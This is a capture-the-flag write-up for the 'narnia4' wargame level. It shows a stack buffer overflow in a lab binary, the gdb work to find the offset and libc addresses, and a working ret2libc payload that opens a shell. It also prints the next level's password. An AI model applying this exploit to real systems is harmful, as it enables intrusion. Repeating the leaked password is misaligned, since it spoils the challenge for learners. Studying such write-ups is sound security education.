# narnia4
slopey112 - 3/6/19

Let's take a look at the binary and see what it does.
```
narnia4@narnia:/narnia$ ./narnia4
narnia4@narnia:/narnia$ ./narnia4 asdf
```
Huh. Nothing seems to happen. Let's take a look at the source code.
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```
Okay, so we get a pointer to the environment variables and they are all overwritten, preventing us from hiding shell code inside the environment variable. However, there are two key observations: 1) Once again, there is no check for bounds on `argv[1]`; 2), the use of `return`.

Given that the vulnerability is a buffer overflow vulnerability, we can simply do a ret2libc attack, just like we did in [narnia2](/narnia/narnia2).

Let's first try to find the offset. After trying a few different values, I find that the offset is 260, +4 for the saved EBP address.
```
Starting program: /narnia/narnia4 $(python -c "print 'A'*264")

Breakpoint 1, 0x0804852c in main ()
(gdb) x/20wx $ebp
0xffffd5b8:	0x41414141	0xf7e2a200	0x00000002	0xffffd654
0xffffd5c8:	0xffffd660	0x00000000	0x00000000	0x00000000
0xffffd5d8:	0xf7fc5000	0xf7ffdc0c	0xf7ffd000	0x00000000
0xffffd5e8:	0x00000002	0xf7fc5000	0x00000000	0x862b9a6b
0xffffd5f8:	0xbcc4967b	0x00000000	0x00000000	0x00000000
```
Now let's find the location of `system` and `/bin/sh`.
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
(gdb) find 0xf7e4c850, +9999999999, "/bin/sh"
0xf7f6ecc8
warning: Unable to access 16000 bytes of target memory at 0xf7fc8a50, halting search.
1 pattern found.
(gdb) x/s 0xf7f6ecc8
0xf7f6ecc8:	"/bin/sh"
```
Now that we have all the pieces, we can make our payload.
```
narnia4@narnia:/narnia$ ./narnia4 $(python -c "print 'A'*264+'\x50\xc8\xe4\xf7'+'BBBB'+'\xc8\xec\xf6\xf7'")
$ cat /etc/narnia_pass/narnia5
faimahchiy
```
